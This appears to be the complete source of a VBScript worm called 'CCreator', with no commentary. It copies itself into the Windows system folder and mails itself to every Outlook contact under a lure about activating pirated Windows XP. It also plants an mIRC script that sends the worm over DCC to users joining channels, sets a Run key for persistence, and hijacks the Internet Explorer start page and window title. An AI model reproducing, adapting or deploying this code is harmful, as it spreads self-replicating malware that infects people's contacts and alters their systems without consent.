'Name:CCreator
'Author:CCreator Blast
'Origin:CHINA-AH-WH
Dim wsh
Dim fso
Set wsh=CreateObject("WScript.Shell")
Set fso=CreateObject("Scripting.FileSystemObject")
on error resume next
fso.CopyFile WScript.ScriptFullName, fso.BuildPath( fso.GetSpecialFolder(1), "CCreator.vbs")
sub out
On Error Resume Next
Set Outlook = CreateObject("Outlook.Application")
If Outlook = "Outlook" Then
Set Mapi=Outlook.GetNameSpace("MAPI")
Set Lists=Mapi.AddressLists
For Each ListIndex In Lists
If ListIndex.AddressEntries.Count <> 0 Then
ContactCount = ListIndex.AddressEntries.Count
For Count= 1 To ContactCount
Set Mail = Outlook.CreateItem(0)
Set Contact = ListIndex.AddressEntries(Count)
Mail.To = Contact.Address
Mail.Subject = "XP盗版转正"
Mail.Body = "盗版转正VBS文件。盗版转正VBS文件。"
Set Attachment=Mail.Attachments
Attachment.Add "C:\windows\system32\CCreator.vbs"
Mail.Send
next
 End if
next
 End if
end sub
out
wsh.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.fuckmicrosoft.com"
wsh.regwrite"HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Window Title","VBS中毒~恭喜!"
 wsh.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\CCractor-Blast","C:\windows\system32\CCreator.vbs"
Function mirc
On Error Resume Next
if fso.fileexists("c:\mirc\mirc.ini") then MircLoc="c:\mirc" 
if fso.fileexists("c:\mirc32\mirc.ini") then MircLoc="c:\mirc"
Programfilesdir=wsh.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if fso.fileexists(Programfilesdir & "\mirc.ini") then MircLoc=Programfilesdir & "\mirc"
set ini = fso.CreateTextFile(MircLoc & "\script.ini", True)
ini.writeline "n0=on 1:JOIN:#:{"
ini.writeline "n1=  /if ( $nick == $me ) { halt }"
ini.writeline "n2=  /.dcc send $nick C:\windows\system32\CCreator.vbs"
ini.writeline "n3=}"
ini.close
wsh.regwrite "HKCU\software\Worm\Mirqued", "1"
end function
mirc
Set wsh=Nothing
Set fso=Nothing